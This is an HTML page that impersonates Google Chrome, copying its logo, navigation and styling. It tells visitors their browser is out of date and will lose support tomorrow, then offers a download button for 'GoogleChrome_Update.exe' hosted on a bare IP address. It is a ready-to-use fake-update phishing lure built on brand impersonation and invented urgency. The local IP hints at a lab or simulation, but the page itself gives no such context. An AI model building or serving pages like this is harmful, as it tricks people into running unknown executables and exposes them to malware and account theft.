<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Google Chrome - New Update Feature</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #fff;
      color: #202124;
    }
    header {
      display: flex;
      align-items: center;
      padding: 12px 24px;
      font-size: 14px;
    }
    header img {
      height: 24px;
      margin-right: 8px;
    }
    nav {
      margin-left: auto;
      display: flex;
      gap: 20px;
    }
    nav a {
      color: #202124;
      text-decoration: none;
    }
    main {
      margin: 80px auto 0 auto;
      max-width: 600px;
      text-align: center;
      padding: 0 20px;
    }
    main img {
      height: 80px;
    }
    h1 {
      font-size: 36px;
      margin: 20px 0 10px;
    }
    a.download-btn {
      display: inline-block;
      background-color: #1a73e8;
      color: white;
      border: none;
      padding: 12px 24px;
      border-radius: 24px;
      font-size: 16px;
      cursor: pointer;
      text-decoration: none;
    }
    a.download-btn:hover {
      background-color: #1558b0;
    }
  </style>
</head>
<body>
  <header>
    <img src="chrome-logo.svg" alt="Chrome logo" />
    <strong>Google Chrome</strong>
    <nav>
      <a href="#">AI Innovations</a>
      <a href="#">Safety</a>
      <a href="#">By Google</a>
      <a href="#">Extensions</a>
    </nav>
  </header>
  <main>
    <img src="chrome-logo.svg" alt="Chrome logo" />
    <h1>Hi User, We detected your version of Google Chrome is out of date. We will stop supporting this version tomorrow. Please download our latest update here. Thank you!</h1>
    <a href="http://192.168.49.1/download/GoogleChrome_Update.exe" class="download-btn" download>Download the latest version</a>
  </main>
</body>
</html>
